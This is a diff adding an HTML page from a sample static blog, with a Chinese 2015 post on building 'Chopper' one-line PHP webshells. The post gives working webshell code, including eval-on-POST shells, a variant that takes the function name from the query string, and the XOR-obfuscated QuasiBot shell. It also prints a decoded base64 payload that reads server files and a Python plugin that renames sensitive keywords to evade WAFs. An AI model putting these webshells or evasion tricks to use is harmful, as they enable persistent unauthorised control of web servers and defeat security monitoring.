@@ -1,0 +1,182 @@
+<html>
+  <head>
+
+        <script type="text/javascript">
+          var wsUri = "ws://localhost:8080/websocket";
+      function init()
+      {
+        websocket = new WebSocket(wsUri);
+        websocket.onclose = function(evt) { onClose(evt) };
+      }
+      function onClose(evt)
+      {
+        console.log('closing');
+        websocket.close();
+        document.location.reload();
+      }
+      window.addEventListener("load", init, false);
+      </script>
+            <meta charSet="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>
+      Sample Fornax blog
+    </title>
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png"/>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans"/>
+    <link rel="stylesheet" href="https://unpkg.com/bulma@0.8.0/css/bulma.min.css"/>
+    <link rel="stylesheet" type="text/css" href="/style/style.css"/>
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="container">
+        <div class="navbar-brand">
+          <a class="navbar-item" href="/">
+            <img src="/images/bulma.png" alt="Logo"/>
+          </a>
+          <span class="navbar-burger burger" data-target="navbarMenu">
+            <span></span>
+            <span></span>
+            <span></span>
+          </span>
+        </div>
+        <div id="navbarMenu" class="navbar-menu">
+          <a class="navbar-item" href="/">
+            Home
+          </a>
+          <a class="navbar-item" href="/about.html">
+            About
+          </a>
+          <a class="navbar-item" href="/contact.html">
+            Contact
+          </a>
+        </div>
+      </div>
+    </nav>
+    <section class="hero is-info is-medium is-bold">
+      <div class="hero-body">
+        <div class="container has-text-centered">
+          <h1 class="title">
+            Lorem ipsum dolor sit amet, consectetur adipiscing elit
+          </h1>
+        </div>
+      </div>
+    </section>
+    <div class="container">
+      <section class="articles">
+        <div class="column is-8 is-offset-2">
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/WitchCraft/Spy/经典菜刀一句话小马及其变形的设计.html">
+                    经典菜刀一句话小马及其变形的设计
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-07-26
+                </p>
+              </div>
+              <div class="content article-body">
+                <p>经典的菜刀一句话类似于：</p>
+<pre><code class="language-PHP">@eval($_POST['pass'])
+</code></pre>
+<p>这里的eval便是我们要执行的动作。而真正要执行的代码以字符串形式存在的$_POST['pass']。</p>
+<p>这类小马总是接受来自客户端的发来的Request，然后对其中特定的邪恶字符串动态求值，并将执行结果以特定的格式Response回客户端。一句话小马的核心特征总是可以归结为这样的形式：</p>
+<pre><code class="language-PHP">$act（$evilStr）
+</code></pre>
+<p>其中，$act可能代表eval、system，或如带e标志的preg_replace之类可执行字符串的动作，$evilStr代表一段以字符串形式存在的邪恶代码。</p>
+<h2>动作</h2>
+<p>在服务端的木马中直接写eval之类的敏感词很可能会导致被查杀。有两种基本思路可以绕过这个问题：</p>
+<ul>
+<li>在服务端的小马里对动作名进行混淆</li>
+<li>从客户端向小马传递动作名，从而避免在服务端的小马里看到eval之类的代码</li>
+</ul>
+<h3>混淆动作名</h3>
+<p>混淆动作名的方法很多，如字符串拼接、base64编码等等。关键是隐藏自己。</p>
+<h3>从客户端传递动作名：</h3>
+<p>木马类似于：</p>
+<pre><code class="language-PHP">$act=$_GET['act'];
+$evilStr=$_POST['evilStr'];
+$act($evilStr);
+</code></pre>
+<p>则客户端POST恶意数据到victim.php?act=eval即可完成。</p>
+<h3>结合两者：</h3>
+<p>比如QuasiBot的服务端木马：</p>
+<pre><code class="language-PHP">if($_GET['_']) {
+    print &quot;&lt;!--&quot;.$_=&quot;{:|&quot;;
+    $_=($_^&quot;&lt;&quot;).($_^&quot;&gt;&quot;).($_^&quot;/&quot;); # 结果为$_=&quot;GET&quot;
+    ${'_'.$_}[&quot;_&quot;](${'_'.$_}[&quot;__&quot;]);    #结果为$_GET['_']($_GET['__'])
+    print &quot;{:|&quot;.md5(&quot;666&quot;.date(&quot;h:d&quot;)).&quot;{:|&quot;.PHP_OS.&quot;{:|--&gt;&quot;;
+}else{
+    //...
+}
+</code></pre>
+<p>很显然，这段代码实际上是利用异或^运算符做了代码混淆，本质上还是通过客户端传递动作名来达到隐蔽自己的效果。</p>
+<h2>邪恶代码的字符串</h2>
+<p>这部分便是我们实际要运行的代码。由于WAF的缘故，经常需要对之进行编码加密，常用的便是利用base64_decode()。
+解密工作可以放到服务端的小马中完成，也可以放在邪恶字符串中——每当邪恶字符串被求值的时候，就会触发自解密。
+比如菜刀的某一段邪恶功能字符串经过整理后可能类似于：</p>
+<pre><code class="language-C#">//ee=
+Response.Write(&quot;-&gt;|&quot;);
+var err:Exception;
+try{
+    eval(
+        System.Text.Encoding.GetEncoding(65001).GetString(
+            System.Convert.FromBase64String(&quot;dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoNjUwMDEpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiejEiXSkpO3ZhciBtPW5ldyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKFAsRW5jb2RpbmcuRGVmYXVsdCk7UmVzcG9uc2UuV3JpdGUobS5SZWFkVG9FbmQoKSk7bS5DbG9zZSgpOw%3D%3D&quot;)
+        ),
+        &quot;unsafe&quot;
+    );
+}catch(err){
+    Response.Write(&quot;ERROR:// &quot;%2Berr.message);
+}
+Response.Write(&quot;|&lt;-&quot;);
+Response.End();
+</code></pre>
+<p>配合着发送的还有这样一个QueryString</p>
+<pre><code class="language-C#">z1=QzpcXERvY3VtZW50cyBhbmQgU2V0dGluZ3NcXEFkbWluaXN0cmF0b3JcXOahjOmdolxcMjIyLmNzdg%3D%3D
+</code></pre>
+<p>其中：</p>
+<ul>
+<li>ee代表的邪恶字符串经过urldecode、base64_decode之后，得到明文是:</li>
+</ul>
+<pre><code class="language-C#">var P=System.Text.Encoding.GetEncoding(65001).GetString(
+    System.Convert.FromBase64String(Request.Item[&quot;z1&quot;])
+);
+var m=new System.IO.StreamReader(P,Encoding.Default);
+Response.Write(m.ReadToEnd());
+m.Close();
+</code></pre>
+<ul>
+<li>z1实际上是一段经过base64编码的字符串，用作ee代表的那段邪恶代码的变量。</li>
+</ul>
+<p>当然，这样直接把eval和base_decode这类敏感词写到邪恶字符串中，还是带有一定的通信特征，很容易被查杀，所以习科核心成员<a href="http://bbs.isilic.org/space-uid-5744.html">半块西瓜皮</a>发布了<a href="http://bbs.isilic.org/forum.php?mod=viewthread&amp;tid=6972&amp;highlight=%E8%8F%9C%E5%88%80">Python插件版的菜刀</a>，支持把eval、base_decode之类的敏感词替换为其他非敏感字符串，然后再在服务端的小马中予以还原。</p>
+<p>Python的插件脚本为：</p>
+<pre><code class="language-Python">def makepostdata(headers,postdata):
+    open('headers.txt','wb').write(headers)
+    open('postdata.txt','wb').write(postdata)
+    headers = headers.replace('X-Forwarded-For','asdasd')
+    postdata = postdata.replace('eval','xxxx')
+    postdata = postdata.replace('base64_decode','yyyy')
+    return headers,postdata
+</code></pre>
+<p>这个插件作者给出的服务端的小马类似于：</p>
+<pre><code class="language-PHP">&lt;?php
+    function xxxx($str){return eval($str);}
+    function yyyy($str){return base64_decode($str);}
+    xxxx($_POST['pass']);
+?&gt;
+</code></pre>
+<p>当然，这种服务端小马尚未对敏感词做混淆，可以配合异或符进一步隐蔽。</p>
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </body>
+</html>
